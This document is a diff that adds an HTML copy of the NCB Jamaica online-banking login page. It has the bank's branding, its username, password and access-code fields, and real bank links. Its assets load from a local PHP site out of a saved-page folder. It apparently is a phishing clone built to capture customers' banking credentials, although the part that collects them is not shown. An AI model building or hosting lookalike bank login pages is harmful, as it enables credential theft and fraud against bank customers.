+<script type="text/javascript">ppX=100;ppY=100;setTimeout('setPinPadCtl(null)',1);</script>
 
 
-<html>
-<head>
-</head>
-<body>
+
+
+
+
 <table>
 
 
 
 
 </table>
-</body>
+
+  <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/pm_fp.html" language="JavaScript" type="text/javascript"> </script>
+
+
+		
+		
+		
+		
+		
+		
+			
+		
+		
+		
+		
+		
+		<script language="javascript">
+			post_deviceprint();
+		</script>
+
+		
+		
+
+
+
+
+
+	
+
+
+
+
+
+	
+
+
+
+
+
+	
+
+
+
+
+
+
+	
+
+
+
+
+
+
+
+	
+
+
+
+
+	
+
+
+
+
+
+	
+
+
+
+
+
+	
+
+
+
+
+
+	
+
+
+
+
+
+	
+
+
+
+
+
+
+
   
+
+
+
+<style>
+.loginPage_dialog .ui-dialog-titlebar-close {display: none }
+.loginPage_dialog .ui-dialog-titlebar{display: none }
+.loginPage_dialog .ui-dialog-title{display: none }
+.loginPage_dialog{
+	box-shadow: 0 0px;
+	background: #FFFFD7;
+	border-radius: 0px;
+	border:  1px solid transparent;
+	overflow: visible;
+	padding:20px;
+	position: absolute;
+	margin-left: 0px !important;
+	margin-top: 35px;
+	outline: none;
+}
+.infopopup {
+	font-size: 14px;
+	color: #000000;
+}
+.infopopup1 {
+	font-size: 14px;
+	color: #000000;
+}
+.infopopupSeperator {
+	margin-top:15px;
+	width: 245px;
+	height: 0px;
+	display: inline-block;
+	border-top: 2px solid #A8A8A8;
+}
+
+.infopopup_highlight {
+	display: inline-block;
+	font-weight: 500;
+	font-size: 16px;
+	color: #2196f3;
+	margin: 15px 0 15px 0;
+	
+}
+.ui-autocomplete
+{
+    background: #FFFFFF !important;
+    color: #FFFFFF;
+    opacity: .99;
+    cursor: default;
+    position: absolute;
+}
+.userid-tooltip .heading3 {
+    color: #2196f3;
+    border-top: 2px solid #A8A8A8;
+    padding: 15px 0;
+    margin-top: 15px;
+}
+.ui-dialog .ui-dialog-content {
+    position: relative;
+    border: 0;
+    padding: 2px 2px;
+    background: none;
+    overflow: visible;
+    zoom: 1; 
+    height: auto !important;  
+}
+
+</style>
+<div id="dialog" title="The function for Remember User Id may not function if your cookies are disabled">
+	<div class="arrow-up"></div>
+  <p id="rememberContentTips1" style="display:none">
+  	<!-- <span class="infopopup1">The function for Remember  User Id may not function if your cookies are disabled</span>-->
+  	<span class="infopopup1">The function for Remember Username may not function if your cookies are disabled</span>
+  	<br><span class="infopopupSeperator"></span><br>
+  	<span class="infopopup_highlight">Security Tip</span><br>
+  	<!-- <span class="infopopup">When you save your user id, it is stored on the computer you are using; therefore you should never store your user id on a public computer.</span>-->
+  	<span class="infopopup">When you save your username, it is stored on 
+the computer you are using; therefore you should never store your user 
+id on a public computer.</span>
+  </p>
+</div> 
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+   
+  
+  
+  
+  
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+    
+ 
+   
+  
+  <div class="width100percent_main_hidden" id="messageContent">
+  
+  
+      
+        
+          
+            
+               
+            
+            
+              
+            
+          <p id="messageContent.Ra1" class="loginrow">
+<span id="messageContent.Ra1.C1" class="center-align"><img src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/hourglass.gif" alt="Hour Image" title="Hour Image" id="hourimage2" border="0"></span><span id="messageContent.Ra1.C2"><span class="" id="captionForDialog1" title="Authenticate yourself on your mobile">Authenticate yourself on your mobile</span></span></p>
+  
+          
+           <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Chart.js"></script>
+          
+  </div>
+
+  <div class="width100percent_main_hidden" id="confirmMessageContent">
+  
+      
+        
+          
+            
+               
+              <!-- <i class="fa fa-hourglass-half fa-3x" aria-hidden="true"></i> -->
+              
+              
+            
+          <div id="confirmMessageContent.Ra1">
+<div id="confirmMessageContent.Ra1.C1"><img src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/hourglass.gif" alt="Hour Image" title="Hour Image" id="hourimage3" border="0"><span class="null" id="Caption14725563">You have confirmed the Login Process</span></div></div>   
+          
+           <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Chart.js"></script>
+          
+  </div>
+
+  <div class="width100percent_main_loginbg no-gutters login-container bg-dark" id="LoginHDisplay">
+    
+    <!--start of subsection--><div id="LoginHDisplay.SS1" class="loginScreenContainer">
+      <div class="" id="LoginHDisplay.RS1">
+      	  
+            
+			
+				<div class="loginLinkcontainer">
+			<div id="loginScreenLink"><a href="https://www.jncb.com/JNCB/media/Main-Librarie/Online%20Banking%20Documents/Personal/Online_Security_Privacy_Policy.pdf" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">Online Security</a></div>
+			<div id="loginScreenSep">|</div>
+			<div id="loginScreenLink"><a href="https://www.jncb.com/" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">FAQs</a></div>
+			<div id="loginScreenSep">|</div>
+			<div id="loginScreenLink"><a href="https://www.jncb.com/Personal/Banking/Online-Bank-Demos" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">Internet Banking Demos</a></div>
+			<div id="loginScreenSep">|</div>
+			<div id="loginScreenLink"><a href="https://www.jncb.com/JNCB/media/Main-Librarie/Online%20Banking%20Documents/Personal/Online_Security_Privacy_Policy.pdf" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">Privacy Policy</a></div>
+			<div id="loginScreenSep">|</div>
+			<div id="loginScreenLink"><a href="https://www.jncb.com/JNCB/media/Main-Librarie/Online%20Banking%20Documents/Personal/NCB_eFinancial_Services_Terms_Conditions.pdf" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">Terms &amp; Conditions</a></div>
+			</div>
+			
+            
+          
+          
+            
+            
+            
+          <p id="LoginHDisplay.R1">
+<span id="LoginHDisplay.R1.C1"><span class="null" id="loginScreenMessage">For more details, call us toll free at 1-888-NCB-FIRST (1-888-622-3477) or message us at ncbinfo@jncb.com</span></span></p>
+
+	  
+
+</div>
+
+   </div>
+<!--end of subsection--> <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Chart.js"></script>
+      
+     <div class="login-main">
+     <div class="login-card">
+     <div class="px-4">
+     <div class="row-login">
+     
+      <div class="login-card-header col-sm-4"><div class="py-4 px-3" id="LoginHDisplay.LoginRowset1">
+      <img src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/logo-white-text.png" class="login-logo" alt="ncb logo">
+
+
+             
+            
+     
+
+              <div class="text-light text-xl fix-to-bottom-sm font-weight-light px-4 py-0 py-sm-4 ">Welcome!
+ 				<div class="login-tip"></div>
+
+</div>
+        </div>
+
+
+</div>
+
+           
+        <div class="login-card-body col-login material"><div class="px-5 pt-3 pb-4" id="LoginHDisplay.LoginRowset2">
+         <div class="text-brand mb-3 text-xl font-weight-light">Log In</div> 
+         
+                                                
+        
+        
+
+
+      
+
+	
+            
+
+
+              		
+
+
+
+
+<!--           <label class="text-sm text-muted">Username</label> -->
+
+
+          
+           
+          <div id="LoginHDisplay.Ra10" class="group">
+<span id="LoginHDisplay.Ra10.C1"><span class=""><input type="text" name="AuthenticationFG.USER_PRINCIPAL" size="28" "="" class="login_user type_UserPrincipal ui-autocomplete-input" data-febatype="UserPrincipal" maxlength="65" id="AuthenticationFG.USER_PRINCIPAL" required="" ondragstart="return false" ondrop="return false" autocomplete="off"><i class="fas fa-user float-right"></i><span class="highlight"></span><span class="bar"></span><label for="AuthenticationFG.USER_PRINCIPAL" id="UserId_Text" class="text-sm text-muted label-user">Username<span class="redstar">*</span></label></span></span></div>  
+   
+          
+         
+           
+          
+          
+
+
+
+
+
+
+
+
+           
+            
+              
+            
+          
+          
+          
+            
+              
+            
+            
+            
+            
+               
+            
+          
+          
+            
+
+		                
+              	
+          				   
+
+            
+          
+          
+		  
+           
+           	
+                	
+            		
+             	
+           
+          <div id="LoginHDisplay.Ra81" class="dummyPasswordField stage3_inputpanel_paydetailsrow loginPanelInputDetailsrow padding_top_style">
+<span id="LoginHDisplay.Ra81.C1" class="leftColumnStyle loginPanelColumnDetailStyle"><div id="F1" class="containerStyle"><input autocomplete="new-password" type="password" name="dummy1" size="28" class="loginPanelTextboxMediumStyle null" id="dummy1" onfocus="settingPinPadCtlOnFocus(this,2,'dummy1'),fixedDisplay(this.id);" maxlength="128" ondragstart="return false" ondrop="return false" value="dummy"><input type="Hidden" name="MIN_LENGTH_OF_PASSWORD" value="8" id="MIN_LENGTH_OF_PASSWORD" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PWD_SPECIAL_CHAR_MANDATORY" value="Y" id="PWD_SPECIAL_CHAR_MANDATORY" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PWDDIGITMAND" value="Y" id="PWDDIGITMAND" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PASSWORD_STRENGTH" value="Too short|Weak|Fair|Strong|Very Strong" id="PASSWORD_STRENGTH" ondragstart="return false" ondrop="return false"><input type="Hidden" name="IMAGE_PATH" value="L001/consumer/images" id="IMAGE_PATH" ondragstart="return false" ondrop="return false"><label for="dummy1" id="label_access_code" class="loginPanelSimpleTextStyle active">Password<span class="redstar">*</span></label></div></span></div> 
+
+
+
+
+
+
+
+           
+            
+              
+            
+            
+              
+                
+                
+              
+            
+          <div id="LoginHDisplay.Ra12" class="group customCheckBoxLogin">
+<span id="LoginHDisplay.Ra12.C1"><input type="checkbox" name="AuthenticationFG.REMEMBER_USER_ID" value="Y" class="loginPanelCheckBox  filled-in" id="AuthenticationFG.REMEMBER_USER_ID" title="Remember User ID" onclick="handleRememberUserId(event);" ondragstart="return false" ondrop="return false"><span class="span-checkbox"></span></span><span id="LoginHDisplay.Ra12.C2"><span class="loginPanelSimpleTextStyle_remUserId " id="Remember_UserId_Label">Remember Me</span><img src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/logininfo.png" alt="Remember Username" title="Remember Username" class="loginPanelInfo" id="remember_user_info" onclick="handleRememberUserIdInfoClick(event);" border="0"></span></div> 
+          
+	             
+	  
+	                  	
+	  
+	  
+	             
+          
+
+
+
+
+
+
+              			
+
+
+
+          
+           
+           	
+                	
+            		
+             	
+           
+          <div id="LoginHDisplay.Ra82" class="dummyPasswordField stage3_inputpanel_paydetailsrow loginPanelInputDetailsrow padding_top_style">
+<span id="LoginHDisplay.Ra82.C1" class="leftColumnStyle loginPanelColumnDetailStyle"><div id="F1" class="containerStyle"><input autocomplete="new-password" type="password" name="dummy2" size="28" class="loginPanelTextboxMediumStyle null" id="dummy2" onfocus="settingPinPadCtlOnFocus(this,2,'dummy2'),fixedDisplay(this.id);" maxlength="128" ondragstart="return false" ondrop="return false" value="dummy"><input type="Hidden" name="MIN_LENGTH_OF_PASSWORD" value="8" id="MIN_LENGTH_OF_PASSWORD" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PWD_SPECIAL_CHAR_MANDATORY" value="Y" id="PWD_SPECIAL_CHAR_MANDATORY" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PWDDIGITMAND" value="Y" id="PWDDIGITMAND" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PASSWORD_STRENGTH" value="Too short|Weak|Fair|Strong|Very Strong" id="PASSWORD_STRENGTH" ondragstart="return false" ondrop="return false"><input type="Hidden" name="IMAGE_PATH" value="L001/consumer/images" id="IMAGE_PATH" ondragstart="return false" ondrop="return false"><label for="dummy2" id="label_access_code" class="loginPanelSimpleTextStyle active">Access Code<span class="redstar">*</span></label></div></span></div> 
+		  
+          
+          
+          
+            
+            
+            
+           
+            		
+            
+            
+            
+            
+           
+            	
+            		
+            
+            
+          
+            
+              
+
+				
+                
+                
+                
+                
+              
+            
+            
+              
+            
+          <div id="LoginHDisplay.Ra25" class="loginrow loginButtonPanel">
+<span id="LoginHDisplay.Ra25.C1"><span class=""><i class="waves-effect waves-light btn login_button waves-input-wrapper lo" style=""><input type="Submit" name="Action.STU_VALIDATE_CREDENTIALS" class="waves-button-input" id="STU_VALIDATE_CREDENTIALS" value="Continue" ondragstart="return false" ondrop="return false"></i></span></span></div> 
+          
+          
+          	  
+              
+			  
+			
+            
+              
+            
+          <p id="LoginHDisplay.Ra15" class="loginrow">
+<span id="LoginHDisplay.Ra15.C3" class="loginPanellabellinkStyle"><span class="login_link_style" id="span_label_new_registration" title="New to online banking"><a href="https://retail.ncbelink.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&amp;__START_TRAN_FLAG__=Y&amp;__EVENT_ID__=LOAD&amp;ACTION.LOAD=Y&amp;__CALL_MODE__=52&amp;AuthenticationFG.LOGIN_FLAG=1&amp;BANK_ID=077&amp;USER_PRINCIPAL=&amp;REMEMBER_USER_ID=" title="New to online banking" id="label_new_registration" name="HREF_label_new_registration" class="Login_linkstyle" target="_blank">New to online banking</a></span></span><span id="LoginHDisplay.Ra15.C1" class="loginPanellabellinkStyle"><span class="login_link_style" id="span_label_forgot_access_code" title="Forgot Password"><a href="https://retail.ncbelink.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&amp;__START_TRAN_FLAG__=Y&amp;__EVENT_ID__=LOAD&amp;ACTION.LOAD=Y&amp;__CALL_MODE__=51&amp;AuthenticationFG.LOGIN_FLAG=1&amp;BANK_ID=077&amp;USER_PRINCIPAL=&amp;REMEMBER_USER_ID=" title="Forgot Password" id="label_forgot_access_code" name="HREF_label_forgot_access_code" class="Login_linkstyle1" target="_blank">Forgot Password</a></span></span></p>
+	
+          
+        
+          
+            
+              
+                
+                
+                
+              
+            
+          
+        
+          
+            
+        
+           
+          
+            
+          
+        </div>
+
+
+</div>
+
+         </div>
+         </div>
+         </div>
+         </div>
+      </div>
+</div>
+ <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Chart.js"></script>
+      
+    
+  </div>
+
+
+  
+ 
+  <input type="Hidden" name="isHorizontalLayout" value="true" id="isHorizontalLayout" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="FG_BUTTONS__" value="VALIDATE_CREDENTIALS,VALIDATE_EV_AUTH_CREDENTIALS,STU_VALIDATE_CREDENTIALS,VALIDATE_CREDENTIALS_DIG_CERT,BACK,CLEAR_VALUES" id="FGBUTTONS" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="AuthenticationFG.TRANSACTION_ID" value="887" id="AuthenticationFG.TRANSACTION_ID" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="AuthenticationFG.IS_FIRST_AUTHENTICATION" value="Y" id="AuthenticationFG.ISFIRSTAUTHENTICATION" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="QS" value="" id="QS" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="USER_ID_COOKIE" value="" id="USER_ID_COOKIE" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="CATEGORY_ID" value="" id="CATEGORYID" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="userType" value="1" id="userType" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="AuthenticationFG.PREFERRED_LANGUAGE" value="001" id="AuthenticationFG.PREFERREDLANGUAGE" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="CAN_USER_SELF_ENABLE" value="" id="CAN_USER_SELF_ENABLE" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="languageId" value="001" id="languageId" ondragstart="return false" ondrop="return false">
+  <input type="Hidden" name="bankId" value="077" id="bankId" ondragstart="return false" ondrop="return false">
+ <input type="Hidden" name="FORMSGROUP_ID__" value="AuthenticationFG" id="FORMSGROUP_ID__" ondragstart="return false" ondrop="return false">
+ <input type="Hidden" name="AuthenticationFG.REPORTTITLE" value="AuthenticationScreenUX5" id="AuthenticationFG.REPORTTITLE" ondragstart="return false" ondrop="return false">
+	
+		
+		
+	<script type="text/javascript">new feba.js.ajax.updateField(
+{
+isListPaginated: "true",
+onComplete: function(){initiateMobileLogin('VALIDATE_MOBILELOGIN1',this);},
+executeOnLoad: "false",
+eventType: "click",
+source: "VALIDATE_MOBILELOGIN",
+forcePreventAjaxCall: "AuthenticationFG.USER_PRINCIPAL",
+jsVarName: "AuthenticationScreenRetail_VALIDATE_MOBILELOGIN",
+baseUrl: "FinacleRiaRequest;jsessionid=0000ymEdq2XgiBAd6a3X01nmrTR:1clmi8n6o?bwayparam=bZwO6rOPIINZnE6rOeJWuhvICEeml%2BDO3rAFVK5W6fEEuFxRYXFfnm9hj9O7iTTqoCR7E2G%2B1rnvS%2Fl%2BBDnLRJ93PzM2Fso5KpdaHliPux2OpTPsCnHX0DoATKj%2FMFaz%0D%0ABLTbL1HiedOzBR0qk4%2FgbQ%3D%3D",
+startIndex: "0",
+displayExceptions: "true",
+forcontrolIDs: "User ID=AuthenticationFG.USER_PRINCIPAL@@Access Code=AuthenticationFG.ACCESS_CODE@@Verification=AuthenticationFG.VERIFICATION_CODE@@null=AuthenticationFG.VERIFICATION_CODE@@Language=AuthenticationFG.PREFERRED_LANGUAGE@@Default Page=AuthenticationFG.MENU_ID@@",
+endIndex: "1",
+action: "VALIDATE_MOBILELOGIN",
+riaFeatureID: "1",
+parameters: "AuthenticationFG.SELECTED_AUTH_MODE={AuthenticationFG.SELECTED_AUTH_MODE}",
+tagHelper: "UPDATE_FIELD.TagHelper"});
+</script><script type="text/javascript">new feba.js.ajax.updateField(
+{
+isListPaginated: "true",
+executeOnLoad: "false",
+onComplete: function(){confirmMLGN('','STATUS_MOBILELOGIN','VALIDATE_MOBILELOGIN1',this);},
+eventType: "click",
+source: "VALIDATE_MOBILELOGIN1",
+forcePreventAjaxCall: "AuthenticationFG.USER_PRINCIPAL",
+target: "STATUS_MOBILELOGIN=AuthenticationFG.STATUS_MOBILELOGIN",
+jsVarName: "AuthenticationScreenRetail_VALIDATE_MOBILELOGIN1",
+onBeforeExecute: false,
+baseUrl: "FinacleRiaRequest;jsessionid=0000ymEdq2XgiBAd6a3X01nmrTR:1clmi8n6o?bwayparam=bZwO6rOPIINZnE6rOeJWuhvICEeml%2BDO3rAFVK5W6fHy2G0p%2FszjAtwU7UVq6BhaTqD3V2UyIVH6BH8uO21jKrPpR2m4sYAN1G6vod1m%2BZ3C98mZZ7QKcd4OMx77g%2Fq0%0D%0AlxE%2BzLvwLjwlfkIujNDrVZVXaPDmYCsLK6kuDn4HQ3fnTqrHTiGKUR3lgZDt8%2F2MjuXfXQQMyJVxdqRkxuGoIvGpXML%2BFWoWYwkTAONEzDc%3D",
+targetsRequired: "AuthenticationFG.STATUS_MOBILELOGIN,,",
+startIndex: "0",
+displayExceptions: "true",
+forcontrolIDs: "User ID=AuthenticationFG.USER_PRINCIPAL@@Access Code=AuthenticationFG.ACCESS_CODE@@Verification=AuthenticationFG.VERIFICATION_CODE@@null=AuthenticationFG.VERIFICATION_CODE@@Language=AuthenticationFG.PREFERRED_LANGUAGE@@Default Page=AuthenticationFG.MENU_ID@@",
+endIndex: "1",
+action: "VALIDATE_MOBILELOGIN1",
+riaFeatureID: "2",
+parameters: "AuthenticationFG.SELECTED_AUTH_MODE={AuthenticationFG.SELECTED_AUTH_MODE}",
+tagHelper: "UPDATE_FIELD.TagHelper"});
+</script>
+
+	<style>
+.collapsible-header_pwdscreen {
+    margin-top: 20px;
+    padding-left: 0px;
+    background-color: #00539b;
+    color: #ffff;}
+
+.collapsible-header {
+    display: inline;
+    cursor: pointer;
+    min-height: 3rem;
+    line-height: 3rem;
+    padding: 0 1rem;
+    /*background-color: #FFFFFF;*/
+    /* border-bottom: 1px solid #ddd; */
+    border-bottom: none;
+}
+.pwdreqtext_pwdscreen {
+    font-size: 15px;
+    line-height: 1.5;
+    color: #000000;
+    font-family: "Roboto", sans-serif !important;
+    padding-left: 32px;}
+    
+.queryitalictextwithmargin {
+    font-size: 13px;
+    color: #424242;
+    float: left;
+    margin-left: 45px;
+    width: 85%;
+    word-wrap: break-word;
+}
+.loginPanelSimpleTextStyle {
+    font-size: 14px !important;}
+    
+input:focus ~ label {
+    color: #00539b !important;
+}
+
+input[type=password]:focus:not([readonly]){
+box-shadow: 0 1px 0 0 #00539b;
+    border-bottom: 1px solid #00539b;
+
+}
+</style> 
+	
+	
+ 
+
+
+
+
+
+
+
+
+
+     
+      
+	
+
+	
+
+
+
+	<div id="footer" role="contentinfo" class="footer-wrapper loginfoorter-wrapper">
+
+           
+	
+	
+	
+	
+	
+	 <div class="copyright">
+                		Copyright 1999-2018 NCB Jamaica. All Rights Reserved
+	</div>
+	<div class="footer-links">
+                    <ul>
+                         <li><a href="https://www.jncb.com/JNCB/media/Main-Librarie/Online%20Banking%20Documents/Personal/Online_Security_Privacy_Policy.pdf" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">Privacy Policy</a></li>
+                        <li>|</li>
+                        <li><a href="https://www.jncb.com/JNCB/media/Main-Librarie/Online%20Banking%20Documents/Personal/NCB_eFinancial_Services_Terms_Conditions.pdf" name="HREFTermsConditionsfooter" target="_blank" id="TermsCondionsfooter">Terms of Use</a></li>
+                    </ul>
+                </div>
+	
+	<div class="footer-links memberOf">
+                    <ul>
+                         <li><a href="http://localhost:8080/phpSite/canda/#" name="HREFPrivacyfooter" id="PrivacyPolicyfooter">Members of:</a></li>
+                    </ul>
+    </div>
+           
+	<div id="footerLoginInner">
+		
+	
+			<!--<span class="footer_firstLine">
+				<a href="http://localhost:8080/phpSite/canda/#" name="HREFSitemapfooter" id="Sitemapfooter" class="whitelink_footer">Site Map</a>
+				<span class="columnSeparator_login"></span>
+					<a href="http://localhost:8080/phpSite/canda/#" name="HREFPrivacyfooter"	id="PrivacyPolicyfooter" class="whitelink_footer">Privacy Policy</a>
+				<span class="columnSeparator_login"></span>
+					<a href="http://localhost:8080/phpSite/canda/#" name="HREFTermsConditionsfooter" id="TermsCondionsfooter" class="whitelink_footer">Terms & Conditions</a>
+				<span class="columnSeparator_login"></span>
+					<a href="http://localhost:8080/phpSite/canda/#" name="HREFDisclaimerfooter" id="Disclaimerfooter" class="whitelink_footer">Disclaimer</a>
+			</span>
+			<p class="simpletext"><span>Copyright &copy; Finacle eBanking, All rights reserved
+			</span>
+			<p class="simpletext">Powered By
+			<span class="footer_secondLine">
+			
+			<img class="footer_img" src="http://localhost:8080/phpSite/canda/L001/consumer/images/finacle-logo.png" border="0">
+			</span>
+			</p>
+			
+		-->
+		
+</div>
+</div>
+
+
+<script type="text/javascript">
+try{
+	feba.domManipulator.documentReady(convertComboboxes);
+	}catch(e){
+	}
+</script>
+
+
+
+<input type="Hidden" name="RIA_TARGETS" value="STATUS_MOBILELOGIN,,," id="RIA_TARGETS" ondragstart="return false" ondrop="return false"><input type="Hidden" name="JS_ENABLED_FLAG" value="Y" id="JS_ENABLED_FLAG" ondragstart="return false" ondrop="return false"><input type="Hidden" name="DECRYPT_FLAG" value="N" id="DECRYPT_FLAG" ondragstart="return false" ondrop="return false"><input type="Hidden" name="CHECKBOX_NAMES__" value="AuthenticationFG.REMEMBER_USER_ID" id="CHECKBOX_NAMES__" ondragstart="return false" ondrop="return false"><input type="Hidden" name="Requestid" value="1" id="Requestid" ondragstart="return false" ondrop="return false"><script type="text/javascript">feba.js.common.checkJS("JS_ENABLED_FLAG");</script><noscript><BR><CENTER><B>
+Your browser is not Javascript enabled. Please enable Javascript for enhanced security.
+</B></CENTER></noscript>
+<input type="HIDDEN" id="__JS_ENCRYPT_KEY__" name="__JS_ENCRYPT_KEY__" value="10001,9c6d3c245e4db24c7e8459961d2cd4796beea397eeb031f4373930c12f5be5cd20f6c99e1b034119ecbc682c6f3ab870f3db5721f8e9c0095ad14d8f9e6ded45b084a774fccfa7d1b6c4a919f6d8cd2b7586fa390cdd650bad9f9563ff6b0a62e708a800d282b00da001fa466d3805f8c0c96bd40ed503815af864e8abc90375,131" ondragstart="return false" ondrop="return false"><script type="text/javascript">jsVarForControlIds="Access Code=AuthenticationFG.dummy2@@AuthenticationFG.dummy2=Access Code@@Password=AuthenticationFG.dummy1@@AuthenticationFG.dummy1=Password@@"</script><script type="text/javascript">jQuery(function(){RedrawAllTrees();jsonObj={"TypesCatalogue":{"UserPrincipal" : {"LEN":"65",
+"JUS":"LEFT_JUSTIFIED",
+"CST":"MIXED_CASE",
+"CNT":"null",
+"SEC":"false",
+"BCC":"false",
+"PTY": "STR"
+}}};init(jsonObj,null,jsVarForControlIds);
+feba.js.common.blockOnButtonClicks("loadingImage");
+feba.js.common.blockOnHyperlinkClicks("loadingImage");
+feba.js.common.runPageCustomFunction("AuthenticationScreenRetail_onload","null");feba.js.common.runModuleCustomFunction("user_onload","null");});</script><script type="text/javascript">doEndBinding();</script><img src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/widget-loading.gif" id="loadingImage" style="display:none;"></form>
+
+<div class="hiddendiv common"></div><ul id="ui-id-1" tabindex="0" class="ui-menu ui-widget ui-widget-content ui-autocomplete ui-front" style="display: none;"></ul><div role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div></body></html>
